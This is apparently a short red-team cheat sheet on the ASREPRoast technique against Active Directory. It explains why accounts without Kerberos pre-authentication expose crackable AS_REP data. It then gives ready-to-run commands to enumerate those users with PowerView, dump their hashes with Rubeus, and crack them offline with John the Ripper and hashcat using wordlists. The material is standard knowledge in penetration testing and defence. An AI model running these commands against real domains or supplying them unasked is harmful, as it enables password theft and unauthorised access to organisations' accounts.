The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).

That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. 
This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

Furthermore, no domain account is needed to perform this attack, only connection to the DC. However, with a domain account, a LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. Otherwise usernames have to be guessed.


#see if the account you disabled appears
Get-DomainUser -PreauthNotRequired -Verbose

#Export hash
.\Rubeus.exe asreproast /format:hashcat /outfile:s4vitar.asreproast

Using bleeding-jumbo branch of John The Ripper, we can brute-force the hashes offline.
./john s4vitar.asreproast --wordlist=rockyou.txt
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
